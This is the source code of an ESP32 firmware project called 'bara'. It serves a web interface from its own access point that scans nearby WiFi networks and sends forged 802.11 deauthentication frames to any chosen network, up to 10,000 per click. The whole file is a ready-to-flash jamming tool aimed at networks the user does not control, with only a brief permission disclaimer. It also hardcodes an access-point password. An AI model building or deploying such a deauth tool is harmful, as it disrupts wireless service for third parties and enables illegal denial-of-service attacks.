/**
 * ██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗  █████╗ ██╗   ██╗
 * ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝
 * ██████╔╝███████║██████╔╝█████╔╝     ██████╔╝███████║ ╚████╔╝
 * ██╔══██╗██╔══██║██╔══██╗██╔═██╗     ██╔══██╗██╔══██║  ╚██╔╝
 * ██████╔╝██║  ██║██║  ██║██║  ██╗    ██████╔╝██║  ██║   ██║
 * ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝
 *
 * Project: bara
 * Developer: Ahmed Nour Ahmed from Qena, Egypt 🇪🇬
 * Description: ESP32-Based WiFi Scanner + Deauth Attack Tool with Hacker UI
 * Language: English
 * Platform: ESP32 (Arduino Core)
 * Requirements: AsyncTCP, ESPAsyncWebServer, WiFi
 * Security Note: Use only on networks you own or have explicit permission to test.
 */

#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <string>
#include <vector>

// Access Point Credentials
const char* ssidAP = "bara";
const char* passwordAP = "A7med@Elshab7";

// Web Server on port 80
AsyncWebServer server(80);

// Global scan results
std::vector<String> scannedNetworks;

// Deauth variables
String targetBSSID = "";
uint8_t targetChannel = 0;
bool deauthActive = false;
uint16_t deauthCount = 100; // default packets
uint64_t deauthStartTime = 0;

// Raw packet buffer for deauth frame
uint8_t deauthPacket[26] = {
  /*  0 -  1 */ 0xC0, 0x00,                         // Type: Deauth, Flags: None
  /*  2 -  3 */ 0x00, 0x00,                         // Duration (will be filled)
  /*  4 -  9 */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Receiver (broadcast)
  /* 10 - 15 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (will be filled)
  /* 16 - 21 */ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (will be filled)
  /* 22 - 23 */ 0x00, 0x00,                         // Fragment & Seq number
  /* 24 - 25 */ 0x01, 0x00                          // Reason: Unspecified (1)
};

// Channel hopper task (optional for better scan, but not used here to keep simplicity)
void startScan() {
  scannedNetworks.clear();
  int n = WiFi.scanNetworks(false, true); // async = false, show_hidden = true
  if (n == 0) {
    scannedNetworks.push_back("<tr><td colspan='5' style='color:#ff3333;'>No networks found.</td></tr>");
    return;
  }

  for (int i = 0; i < n; ++i) {
    String tr = "<tr>";
    tr += "<td>" + String(WiFi.SSID(i)) + "</td>";
    tr += "<td>" + String(WiFi.BSSIDstr(i)) + "</td>";
    tr += "<td>" + String(WiFi.RSSI(i)) + " dBm</td>";
    tr += "<td>" + String(WiFi.channel(i)) + "</td>";
    tr += "<td>";
    switch (WiFi.encryptionType(i)) {
      case WIFI_AUTH_OPEN: tr += "Open"; break;
      case WIFI_AUTH_WEP: tr += "WEP"; break;
      case WIFI_AUTH_WPA_PSK: tr += "WPA"; break;
      case WIFI_AUTH_WPA2_PSK: tr += "WPA2"; break;
      case WIFI_AUTH_WPA_WPA2_PSK: tr += "WPA/WPA2"; break;
      case WIFI_AUTH_WPA2_ENTERPRISE: tr += "WPA2-EAP"; break;
      default: tr += "Unknown"; break;
    }
    tr += "</td>";
    tr += "<td><button class='btn-attack' onclick=\"deauth('";
    tr += WiFi.BSSIDstr(i);
    tr += "', ";
    tr += WiFi.channel(i);
    tr += ")\">DEAUTH</button></td>";
    tr += "</tr>";
    scannedNetworks.push_back(tr);
  }
}

// Deauth task (runs in separate core if needed, but we use simple busy-loop for demo)
void sendDeauthPackets(const uint8_t* bssid, uint8_t channel, uint16_t count) {
  if (channel != WiFi.channel()) {
    WiFi.disconnect();
    WiFi.mode(WIFI_STA);
    WiFi.setChannel(channel);
    delay(10);
  }

  for (int i = 0; i < 6; ++i) deauthPacket[10 + i] = bssid[i];
  for (int i = 0; i < 6; ++i) deauthPacket[16 + i] = bssid[i];

  for (uint16_t i = 0; i < count && deauthActive; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(1); // minimal spacing
  }
}

String getNetworkTable() {
  String table = "";
  for (const auto& row : scannedNetworks) {
    table += row;
  }
  return table;
}

// Web interface HTML (Hacker-style)
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>bara - WiFi Hacker Tool</title>
  <style>
    body {
      background-color: #000;
      color: #0f0;
      font-family: 'Courier New', monospace;
      margin: 0;
      padding: 20px;
      overflow-x: hidden;
    }
    h1 {
      text-align: center;
      text-shadow: 0 0 10px #0f0, 0 0 20px #0f0;
      letter-spacing: 3px;
    }
    .container {
      max-width: 1200px;
      margin: 0 auto;
    }
    .scan-btn, .stop-btn {
      background: #002200;
      color: #0f0;
      border: 1px solid #0f0;
      padding: 10px 20px;
      margin: 10px 5px;
      cursor: pointer;
      font-family: inherit;
      font-weight: bold;
      text-transform: uppercase;
      box-shadow: 0 0 10px rgba(0,255,0,0.5);
    }
    .scan-btn:hover { background: #003300; }
    .stop-btn { background: #300; border-color: #f00; color: #f33; box-shadow: 0 0 10px rgba(255,0,0,0.5); }
    table {
      width: 100%;
      border-collapse: collapse;
      margin-top: 20px;
      color: #0f0;
    }
    th, td {
      border: 1px solid #0a0;
      padding: 10px;
      text-align: left;
    }
    th {
      background-color: rgba(0,50,0,0.5);
    }
    .btn-attack {
      background: #300;
      color: #f33;
      border: 1px solid #f00;
      padding: 5px 10px;
      cursor: pointer;
      font-family: inherit;
    }
    .status {
      text-align: center;
      margin: 15px 0;
      font-size: 18px;
      min-height: 26px;
    }
    .count-input {
      background: #001100;
      color: #0f0;
      border: 1px solid #0a0;
      padding: 5px;
      width: 80px;
      text-align: center;
    }
    .footer {
      text-align: center;
      margin-top: 30px;
      font-size: 12px;
      color: #080;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>🩸 bara - Elite WiFi Scanner & Deauth Tool 🩸</h1>
    <div class="status" id="status">Ready.</div>
    
    <button class="scan-btn" onclick="scan()">SCAN NETWORKS</button>
    <button class="stop-btn" onclick="stopDeauth()">STOP DEAUTH</button>
    Deauth Packets: <input type="number" id="pktCount" class="count-input" value="100" min="1" max="10000">

    <div id="tableContainer">
      <table id="netTable">
        <thead>
          <tr>
            <th>SSID</th>
            <th>BSSID</th>
            <th>RSSI</th>
            <th>CH</th>
            <th>ENC</th>
            <th>ACTION</th>
          </tr>
        </thead>
        <tbody id="networkRows">
          <tr><td colspan="6">Press SCAN to discover networks.</td></tr>
        </tbody>
      </table>
    </div>

    <div class="footer">
      Developed by Ahmed Nour Ahmed from Qena 🇪🇬 | Tool: bara | Use Responsibly.
    </div>
  </div>

  <script>
    function scan() {
      document.getElementById('status').innerText = 'Scanning...';
      fetch('/scan')
        .then(response => response.text())
        .then(html => {
          document.getElementById('networkRows').innerHTML = html;
          document.getElementById('status').innerText = 'Scan complete.';
        })
        .catch(err => {
          document.getElementById('status').innerText = 'Scan failed: ' + err;
        });
    }

    function deauth(bssid, channel) {
      const count = document.getElementById('pktCount').value || 100;
      const status = document.getElementById('status');
      status.innerText = 'Launching deauth attack on ' + bssid + '...';
      fetch(`/deauth?bssid=${encodeURIComponent(bssid)}&channel=${channel}&count=${count}`)
        .then(res => res.text())
        .then(msg => {
          status.innerText = msg;
        })
        .catch(err => {
          status.innerText = 'Attack error: ' + err;
        });
    }

    function stopDeauth() {
      fetch('/stop')
        .then(res => res.text())
        .then(msg => {
          document.getElementById('status').innerText = msg;
        });
    }
  </script>
</body>
</html>
)rawliteral";

void setup() {
  Serial.begin(115200);

  // Set WiFi to STA+AP mode
  WiFi.mode(WIFI_AP_STA);

  // Configure AP
  WiFi.softAP(ssidAP, passwordAP);
  Serial.println("Access Point started:");
  Serial.print("SSID: "); Serial.println(ssidAP);
  Serial.print("IP: "); Serial.println(WiFi.softAPIP());

  // Initialize raw transmit (required for deauth)
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(nullptr);

  // Web Routes
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send_P(200, "text/html", index_html);
  });

  server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request){
    startScan();
    String table = getNetworkTable();
    request->send(200, "text/html", table);
  });

  server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request){
    if (!request->hasParam("bssid") || !request->hasParam("channel")) {
      request->send(400, "text/plain", "Missing bssid or channel");
      return;
    }

    String bssidStr = request->getParam("bssid")->value();
    uint8_t ch = request->getParam("channel")->value().toInt();
    uint16_t count = 100;
    if (request->hasParam("count")) {
      count = request->getParam("count")->value().toInt();
      if (count < 1) count = 1;
      if (count > 10000) count = 10000;
    }

    // Parse BSSID
    uint8_t bssid[6];
    int idx = 0;
    for (int i = 0; i < bssidStr.length() && idx < 6; i += 3) {
      bssid[idx++] = (uint8_t)strtol(bssidStr.substring(i, i+2).c_str(), NULL, 16);
    }

    if (idx != 6) {
      request->send(400, "text/plain", "Invalid BSSID format");
      return;
    }

    deauthActive = true;
    targetBSSID = bssidStr;
    targetChannel = ch;
    deauthCount = count;

    // Run deauth in blocking mode (simple for ESP32 demo)
    sendDeauthPackets(bssid, ch, count);
    deauthActive = false;

    String response = "Sent " + String(count) + " deauth packets to " + bssidStr;
    request->send(200, "text/plain", response);
  });

  server.on("/stop", HTTP_GET, [](AsyncWebServerRequest *request){
    deauthActive = false;
    request->send(200, "text/plain", "Deauth attack stopped.");
  });

  server.begin();
  Serial.println("Web server started.");
}

void loop() {
  // Keep alive; deauth is handled synchronously in callback for simplicity
  delay(100);
}